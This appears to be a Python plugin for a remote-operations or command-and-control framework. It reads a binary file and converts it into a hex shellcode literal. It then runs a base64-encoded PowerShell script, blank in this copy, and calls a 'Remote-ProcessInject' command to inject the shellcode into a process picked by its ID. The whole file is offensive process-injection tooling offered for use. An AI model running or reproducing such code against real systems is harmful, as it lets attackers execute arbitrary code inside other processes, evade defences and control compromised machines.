import json
import re
import base64
from remoteops.commands.plugin_api import PluginError

def fileexist(filepath):
    try:
        with open(filepath,"rb") as file:
            file_content = file.read()
    except FileNotFoundError:
        raise PluginError("Error: The file you are trying to open does not exist.")
    
    except PermissionError:
        raise PluginError("Error: You do not have permission to open this file.")
    except OSError as e:
        raise PluginError(f"A system error occurred: {e}")
    return True

def bin_to_hex_literal(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    hex_items = [f"0x{b:02x}" for b in data]
    return f"'\u007b{','.join(hex_items)}\u007d'"

def run(ctx, args):
    filepath = args.get("file")
    exist = fileexist(filepath)
    if not exist:
        raise PluginError("Error loading in binary file.")
    tobin = bin_to_hex_literal(filepath)
    processid = int(args.get("processid"))
    if processid <= 0:
        raise PluginError("Process Id can't be <= 0")
    ps = ''
    
    script = base64.b64decode(ps).decode("utf-8-sig")
    ctx.powershell(script)
    result = ctx.powershell(f"Remote-ProcessInject -TargetPID {processid} -Shellcode {tobin}")
    return [
        {"Output": line}
        for line in result.get("stdout", "").splitlines()
    ]
